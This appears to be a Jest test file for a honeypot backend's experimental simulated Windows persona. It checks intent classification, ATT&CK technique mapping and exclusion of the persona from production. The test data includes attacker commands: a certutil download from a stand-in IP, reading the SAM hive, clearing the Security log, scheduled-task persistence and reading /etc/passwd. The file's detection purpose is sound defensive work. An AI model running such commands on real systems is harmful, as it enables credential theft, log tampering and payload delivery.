'use strict'
/**
 * Rank 7: the experimental simulated Windows persona on the backend (utils/windowsPersona.js, deceptionProfiles.js,
 * mitreMapping.js, capabilityService.js). Logger mocked (nothing written to backend/logs); in-memory MongoDB;
 * evidence directories are temporary.
 */
jest.mock('../utils/logger', () => ({ info: jest.fn(), warn: jest.fn(), error: jest.fn(), debug: jest.fn() }))

const fs = require('fs')
const os = require('os')
const path = require('path')
const mongoose = require('mongoose')
const { MongoMemoryServer } = require('mongodb-memory-server')

const win = require('../utils/windowsPersona')
const mitre = require('../utils/mitreMapping')
const profiles = require('../utils/deceptionProfiles')
const { shadowPolicyRecord } = require('../utils/shadowPolicy')
const { windowsPersonaItems, latestRank7Status, getCapabilities, LABELS } = require('../services/capabilityService')

const CORPUS = JSON.parse(
  fs.readFileSync(
    path.join(__dirname, '..', '..', 'ai-engine', 'tests', 'fixtures', 'windows_intent_corpus.json'),
    'utf8'
  )
)
const collectorClassify = require('../../honeypot/collectors/session_collector').classifyIntent

describe('Windows intent and ATT&CK rules', () => {
  test.each(CORPUS.windows)('%s -> %s (same as the Python rules)', (cmd, intent) => {
    expect(win.classifyWindowsIntent(cmd)).toBe(intent)
  })

  // Rank 8: the Windows rules are persona-gated, so Linux sessions keep exactly the Linux mappings even for commands
  // whose names exist on both systems (hostname, ping, ps, ls, dir, arp).
  test('Linux sessions never get Windows technique rules (persona gating)', () => {
    for (const cmd of CORPUS.linux_unchanged) {
      const linux = mitre.getMitreTechniquesForCommands([cmd]).map((x) => x.id)
      for (const persona of [undefined, 'ubuntu_22', 'centos_7', 'debian_11', 'aws_ec2', 'raspberry_pi'])
        expect(mitre.getMitreTechniquesForCommands([cmd], { persona }).map((x) => x.id)).toEqual(linux)
    }
  })

  test.each(Object.entries(CORPUS.windows_attack))('Windows ATT&CK %s -> %j (same as Python)', (cmd, expected) => {
    const got = []
    for (const [pattern, tech] of win.WINDOWS_COMMAND_TECHNIQUES)
      if (!got.includes(tech.id) && pattern.test(cmd)) got.push(tech.id)
    expect(got).toEqual(expected)
  })

  test('Windows commands get ATT&CK techniques; existing mappings still apply', () => {
    const ids = (c) => mitre.getMitreTechniquesForCommands([c], { persona: 'windows_srv' }).map((t) => t.id)
    expect(ids('systeminfo')).toEqual(['T1082'])
    expect(ids('tasklist /svc')).toEqual(['T1057'])
    expect(ids('wevtutil cl Security')).toEqual(['T1685.005'])
    expect(ids('net user')).toEqual(['T1087.001'])
    expect(ids('type C:\\Windows\\System32\\config\\SAM')).toEqual(['T1003.002'])
    expect(ids('certutil -urlcache -f http://198.51.100.7/a a')).toEqual(['T1105'])
    expect(ids('schtasks /create /tn upd /tr a.exe')).toEqual(['T1053.005'])
    // unchanged Linux behaviour (Linux session: no Windows rules)
    const linuxIds = (c) => mitre.getMitreTechniquesForCommands([c]).map((x) => x.id)
    expect(linuxIds('uname -a')).toEqual(['T1082'])
    expect(linuxIds('cat /etc/passwd')).toEqual(['T1003.008'])
    expect(linuxIds('whoami')).toEqual(['T1033'])
    expect(linuxIds('ls -la')).toEqual([])
    expect(ids('ls -la')).toEqual(['T1083']) // in the simulated Windows shell ls is Get-ChildItem
  })
})

describe('intentForSession (session-gated Windows rules)', () => {
  test('the Linux intent wins whenever it found something', async () => {
    const lookup = jest.fn()
    expect(await win.intentForSession('uname -a', 's1', collectorClassify('uname -a'), lookup)).toBe('RECONNAISSANCE')
    expect(lookup).not.toHaveBeenCalled()
  })

  test('Windows rules apply only to windows_srv sessions; lookup failures keep the Linux intent', async () => {
    const cmd = 'certutil -urlcache -f http://198.51.100.7/a a'
    expect(collectorClassify(cmd)).toBe('UNKNOWN')
    expect(await win.intentForSession(cmd, 's', 'UNKNOWN', async () => 'windows_srv')).toBe('MALWARE_DOWNLOAD')
    for (const p of ['ubuntu_22', 'centos_7', null, undefined])
      expect(await win.intentForSession(cmd, 's', 'UNKNOWN', async () => p)).toBe('UNKNOWN')
    expect(
      await win.intentForSession(cmd, 's', 'UNKNOWN', async () => {
        throw new Error('db down')
      })
    ).toBe('UNKNOWN')
  })

  describe('with the session store (in-memory MongoDB, read-only lookup)', () => {
    let mongoServer
    const HoneypotSession = require('../models/HoneypotSession')
    beforeAll(async () => {
      mongoServer = await MongoMemoryServer.create()
      await mongoose.connect(mongoServer.getUri())
      await HoneypotSession.create([
        { sessionId: 'w1', sourceIP: '198.51.100.9', servedProfile: 'windows_srv' },
        { sessionId: 'l1', sourceIP: '198.51.100.9', servedProfile: 'ubuntu_22' },
      ])
    }, 60000)
    afterAll(async () => {
      await mongoose.disconnect()
      if (mongoServer) await mongoServer.stop()
    })

    test('looks up the served persona of the session', async () => {
      expect(await win.intentForSession('systeminfo', 'w1', 'UNKNOWN')).toBe('RECONNAISSANCE')
      expect(await win.intentForSession('systeminfo', 'l1', 'UNKNOWN')).toBe('UNKNOWN')
      expect(await win.intentForSession('systeminfo', 'missing', 'UNKNOWN')).toBe('UNKNOWN')
      const before = await HoneypotSession.find().lean()
      await win.intentForSession('net user', 'w1', 'UNKNOWN')
      expect(await HoneypotSession.find().lean()).toEqual(before)
    })
  })
})

describe('persona metadata and production exclusion', () => {
  test('the five servable personas are unchanged; windows_srv is experimental and not production-eligible', () => {
    expect(profiles.SERVABLE_DECEPTION_PROFILES).toEqual([
      'ubuntu_22',
      'debian_11',
      'centos_7',
      'aws_ec2',
      'raspberry_pi',
    ])
    expect(profiles.UNSUPPORTED_PROFILES).toEqual(['windows_srv'])
    expect(profiles.EXPERIMENTAL_PROFILES).toEqual(['windows_srv'])
    expect(profiles.PERSONA_STATUS.windows_srv).toMatchObject({
      supported: true,
      experimental: true,
      productionEligible: false,
      servingEnabled: false,
    })
    for (const p of profiles.SERVABLE_DECEPTION_PROFILES)
      expect(profiles.PERSONA_STATUS[p]).toMatchObject({ productionEligible: true, experimental: false })
  })

  test('v2 shadow evidence still refuses windows_srv', () => {
    expect(shadowPolicyRecord({ mode: 'shadow', recommendation: 'windows_srv', status: 'OK' })).toMatchObject({
      recommendation: null,
      status: 'INVALID_RECOMMENDATION',
    })
  })

  test('the backend still refuses to record windows_srv as served', async () => {
    jest.resetModules()
    jest.doMock('../utils/logger', () => ({ info: jest.fn(), warn: jest.fn(), error: jest.fn(), debug: jest.fn() }))
    jest.doMock('../services/aiEngineService', () => ({}))
    jest.doMock('../websocket/socketManager', () => ({}))
    const hs = require('../services/honeypotService')
    await expect(hs.setActiveProfile('windows_srv')).rejects.toMatchObject({ statusCode: 400 })
  })
})

describe('Capability Status', () => {
  const byId = (items) => Object.fromEntries(items.map((i) => [i.id, i]))
  const PASS = {
    tests: { passed: true, failed: 0 },
    cowrieVersion: '3.1.3',
    supportedCommandCount: 50,
    evidence: 'audit/x/',
  }

  test('implementation, test verification, experimental status and production eligibility are separate', () => {
    const c = byId(windowsPersonaItems({ servablePersonas: ['ubuntu_22'] }, PASS))
    expect(c.windows_persona_simulation.label).toBe('implemented_and_tested_simulated')
    expect(c.windows_persona_simulation.summary).toMatch(/SIMULATION/)
    expect(c.windows_persona_simulation.summary).toMatch(/not a Windows host/)
    expect(c.windows_persona_simulation.facts).toMatchObject({
      implementation: 'implemented',
      testVerification: 'passed',
      live: false,
    })
    expect(c.windows_persona.label).toBe('implemented_not_enabled')
    expect(c.windows_persona.facts).toMatchObject({
      experimental: true,
      productionEligible: false,
      servingEnabled: false,
    })
  })

  test('missing or failed evidence is never shown as tested', () => {
    expect(byId(windowsPersonaItems(null, null)).windows_persona_simulation.facts.testVerification).toBe('not_verified')
    const failed = byId(windowsPersonaItems(null, { tests: { passed: false, failed: 2 } })).windows_persona_simulation
    expect(failed.label).toBe('implemented_not_enabled')
    expect(failed.facts.testVerification).toBe('failed')
  })

  test('latestRank7Status reads only the newest run', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'rank7-'))
    fs.mkdirSync(path.join(dir, 'run_20261114T100000Z'))
    fs.writeFileSync(path.join(dir, 'run_20261114T100000Z', 'rank7_status.json'), JSON.stringify(PASS))
    expect(latestRank7Status(dir).evidence).toBe('audit/rank7_windows_persona/run_20261114T100000Z/')
    fs.mkdirSync(path.join(dir, 'run_20261114T110000Z')) // newer, unreadable
    expect(latestRank7Status(dir)).toBeNull()
    expect(latestRank7Status(path.join(os.tmpdir(), 'no-such-rank7'))).toBeNull()
  })

  test('the full report keeps the earlier entries and labels are known', async () => {
    const items = (await getCapabilities()).items
    const ids = items.map((i) => i.id)
    for (const id of [
      'windows_persona',
      'windows_persona_simulation',
      'persona_policy_v2',
      'persona_policy_v2_shadow',
      'pcap_replay',
    ])
      expect(ids).toContain(id)
    for (const i of items) expect(Object.keys(LABELS)).toContain(i.label)
  })
})
